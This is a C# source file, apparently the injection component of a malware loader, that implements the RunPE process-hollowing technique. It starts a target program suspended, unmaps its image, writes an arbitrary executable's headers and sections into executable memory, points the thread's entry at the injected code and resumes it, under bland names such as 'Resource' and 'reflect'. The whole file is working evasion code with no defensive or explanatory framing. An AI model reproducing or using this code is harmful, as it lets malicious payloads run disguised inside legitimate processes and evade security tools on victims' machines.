using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security;
using System.Text;
using System.Threading.Tasks;

namespace Resource
{
    public class reflect
    {
        [DllImport("kernel32.dll", EntryPoint = "CreateProcess", CharSet = CharSet.Unicode), SuppressUnmanagedCodeSecurity()]
        private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref STARTUP_INFORMATION startupInfo, ref PROCESS_INFORMATION processInformation);

        [DllImport("kernel32.dll", EntryPoint = "GetThreadContext"), SuppressUnmanagedCodeSecurity()]
        private static extern bool GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "Wow64GetThreadContext"), SuppressUnmanagedCodeSecurity()]
        private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "SetThreadContext"), SuppressUnmanagedCodeSecurity()]
        private static extern bool SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "Wow64SetThreadContext"), SuppressUnmanagedCodeSecurity()]
        private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

        [DllImport("kernel32.dll", EntryPoint = "ReadProcessMemory"), SuppressUnmanagedCodeSecurity()]
        private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

        [DllImport("kernel32.dll", EntryPoint = "WriteProcessMemory"), SuppressUnmanagedCodeSecurity()]
        private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

        [DllImport("ntdll.dll", EntryPoint = "NtUnmapViewOfSection"), SuppressUnmanagedCodeSecurity()]
        private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

        [DllImport("kernel32.dll", EntryPoint = "VirtualAllocEx"), SuppressUnmanagedCodeSecurity()]
        private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

        [DllImport("kernel32.dll", EntryPoint = "ResumeThread"), SuppressUnmanagedCodeSecurity()]
        private static extern int ResumeThread(IntPtr handle);

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct PROCESS_INFORMATION
        {
            public IntPtr ProcessHandle;
            public IntPtr ThreadHandle;
            public uint ProcessId;
            public uint ThreadId;
        }

        [StructLayout(LayoutKind.Sequential, Pack = 1)]
        private struct STARTUP_INFORMATION
        {
            public uint Size;
            public string Reserved1;
            public string Desktop;

            public string Title;
            [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]

            public byte[] Misc;
            public IntPtr Reserved2;
            public IntPtr StdInput;
            public IntPtr StdOutput;
            public IntPtr StdError;
        }

        public static bool Run(string path, string cmd, byte[] data, bool compatible)
        {
            for (int I = 1; I <= 5; I++)
            {
                if (HandleRun(path, cmd, data, compatible))
                    return true;
            }

            return false;
        }

        private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
        {
            int ReadWrite = 0;
            string QuotedPath = string.Format("\"{0}\"", path);

            STARTUP_INFORMATION SI = new STARTUP_INFORMATION();
            PROCESS_INFORMATION PI = new PROCESS_INFORMATION();

            SI.Size = Convert.ToUInt32(Marshal.SizeOf(typeof(STARTUP_INFORMATION)));

            try
            {
                if (!string.IsNullOrEmpty(cmd))
                {
                    QuotedPath = QuotedPath + " " + cmd;
                }

                if (!CreateProcess(path, QuotedPath, IntPtr.Zero, IntPtr.Zero, false, 4, IntPtr.Zero, null, ref SI, ref PI))
                    throw new Exception();

                int FileAddress = BitConverter.ToInt32(data, 60);
                int ImageBase = BitConverter.ToInt32(data, FileAddress + 52);

                int[] Context = new int[179];
                Context[0] = 65538;

                if (IntPtr.Size == 4)
                {
                    if (!GetThreadContext(PI.ThreadHandle, Context))
                        throw new Exception();
                }
                else
                {
                    if (!Wow64GetThreadContext(PI.ThreadHandle, Context))
                        throw new Exception();
                }

                int Ebx = Context[41];
                int BaseAddress = 0;

                if (!ReadProcessMemory(PI.ProcessHandle, Ebx + 8, ref BaseAddress, 4, ref ReadWrite))
                    throw new Exception();

                if (ImageBase == BaseAddress)
                {
                    if (!(NtUnmapViewOfSection(PI.ProcessHandle, BaseAddress) == 0))
                        throw new Exception();
                }

                int SizeOfImage = BitConverter.ToInt32(data, FileAddress + 80);
                int SizeOfHeaders = BitConverter.ToInt32(data, FileAddress + 84);

                bool AllowOverride = false;
                int NewImageBase = VirtualAllocEx(PI.ProcessHandle, ImageBase, SizeOfImage, 12288, 64);

                //This is the only way to execute under certain conditions. However, it may show
                //an application error probably because things aren't being relocated properly.

                if (!compatible && NewImageBase == 0)
                {
                    AllowOverride = true;
                    NewImageBase = VirtualAllocEx(PI.ProcessHandle, 0, SizeOfImage, 12288, 64);
                }

                if (NewImageBase == 0)
                    throw new Exception();

                if (!WriteProcessMemory(PI.ProcessHandle, NewImageBase, data, SizeOfHeaders, ref ReadWrite))
                    throw new Exception();

                int SectionOffset = FileAddress + 248;
                short NumberOfSections = BitConverter.ToInt16(data, FileAddress + 6);

                for (int I = 0; I <= NumberOfSections - 1; I++)
                {
                    int VirtualAddress = BitConverter.ToInt32(data, SectionOffset + 12);
                    int SizeOfRawData = BitConverter.ToInt32(data, SectionOffset + 16);
                    int PointerToRawData = BitConverter.ToInt32(data, SectionOffset + 20);

                    if (!(SizeOfRawData == 0))
                    {
                        byte[] SectionData = new byte[SizeOfRawData];
                        Buffer.BlockCopy(data, PointerToRawData, SectionData, 0, SectionData.Length);

                        if (!WriteProcessMemory(PI.ProcessHandle, NewImageBase + VirtualAddress, SectionData, SectionData.Length, ref ReadWrite))
                            throw new Exception();
                    }

                    SectionOffset += 40;
                }

                byte[] PointerData = BitConverter.GetBytes(NewImageBase);
                if (!WriteProcessMemory(PI.ProcessHandle, Ebx + 8, PointerData, 4, ref ReadWrite))
                    throw new Exception();

                int AddressOfEntryPoint = BitConverter.ToInt32(data, FileAddress + 40);

                if (AllowOverride)
                    NewImageBase = ImageBase;
                Context[44] = NewImageBase + AddressOfEntryPoint;

                if (IntPtr.Size == 4)
                {
                    if (!SetThreadContext(PI.ThreadHandle, Context))
                        throw new Exception();
                }
                else
                {
                    if (!Wow64SetThreadContext(PI.ThreadHandle, Context))
                        throw new Exception();
                }

                if (ResumeThread(PI.ThreadHandle) == -1)
                    throw new Exception();
            }
            catch
            {
                Process P = Process.GetProcessById(Convert.ToInt32(PI.ProcessId));
                if (P != null)
                    P.Kill();

                return false;
            }

            return true;
        }


    }
}
